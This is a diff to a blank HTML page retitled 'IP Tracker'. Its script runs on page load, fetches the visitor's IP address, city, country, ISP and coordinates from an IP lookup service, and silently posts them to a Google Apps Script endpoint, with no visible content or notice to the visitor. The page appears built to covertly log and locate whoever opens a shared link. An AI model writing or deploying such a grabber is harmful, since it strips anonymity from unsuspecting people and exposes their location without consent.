@@ -1,36 +1,42 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Old Document</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IP Tracker</title>
 </head>
 <body>
-  <script>
-    async function postData() {
-      try {
-        const ipResponse = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipResponse.json();
-        const ip = ipData.ip;
+<script>
+async function postData() {
+  try {
+    const ipRes = await fetch("https://ipinfo.io/json?nocache=" + Date.now());
+    const ipData = await ipRes.json();
 
-        const scriptURL = "https://script.google.com/macros/s/AKfycbxFtPP3r2lQ19mxCAux0cfQTsaOxXMwkAT_xWDncLxXzKcIJTe12bP1uEAsJuVZ_MGB/exec";
-        const formData = new FormData();
+    const formData = new FormData();
+    formData.append("nama", "Visitor");
+    formData.append("ip", ipData.ip || "-");
+    formData.append("kota", ipData.city || "-");
+    formData.append("negara", ipData.country || "-");
+    formData.append("isp", ipData.org || "-");
+    formData.append("lokasi", ipData.loc || "-");
 
-        formData.append("nama", "Visitor");
-        formData.append("ip", ip);
-
-        const res = await fetch(scriptURL, { method: "POST", body: formData });
-        const result = await res.text();
-
-        console.log("Fuck you asshole", result);
-
-      } catch (error) {
-        console.error("Error:", error);
+    await fetch(
+      "https://script.google.com/macros/s/AKfycby2e7KlEmFsgjiTu8hpcMqVwCF1hSBKmrG3CZ0jUdE6b0WqpXj0Q-oWHyYJBzQ1xB29/exec",
+      {
+        method: "POST",
+        body: formData,
+        cache: "no-store"
       }
-    }
+    );
 
-    window.onload = postData;
-  </script>
+    console.log("Data terkirim");
+
+  } catch (err) {
+    alert("API GAGAL: " + err);
+    console.error(err);
+  }
+}
+window.onload = postData;
+</script>
 </body>
 </html>
-
